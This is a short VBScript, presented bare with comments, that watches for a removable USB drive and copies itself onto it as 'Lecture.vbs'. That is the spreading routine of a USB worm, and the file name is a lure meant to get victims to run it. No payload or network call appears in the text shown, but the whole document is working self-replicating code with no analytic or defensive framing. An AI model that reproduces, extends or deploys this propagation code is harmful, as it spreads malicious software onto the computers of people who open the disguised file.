Set objFSO = CreateObject("Scripting.FileSystemObject")

' Path to the USB drive
usbDrivePath = ""

' Check for the USB drive in a loop
Do
    ' Get the list of all available drives
    Set colDrives = objFSO.Drives

    ' Iterate over each drive
    For Each objDrive in colDrives
        ' Check if the drive is removable (i.e., potentially a USB drive) and ready
        If objDrive.DriveType = 1 And objDrive.IsReady Then
            ' Construct the path to the drive
            usbDrivePath = objDrive.DriveLetter & ":\"

            ' Exit the loop if a USB drive is found
            Exit Do
        End If
    Next

    ' Wait for some time before checking again (e.g., 5 seconds)
    WScript.Sleep 5000
Loop

' If a USB drive is found, copy the script to it as Lecture.vbs
If usbDrivePath <> "" Then
    objFSO.CopyFile WScript.ScriptFullName, usbDrivePath & "\Lecture.vbs"
End If
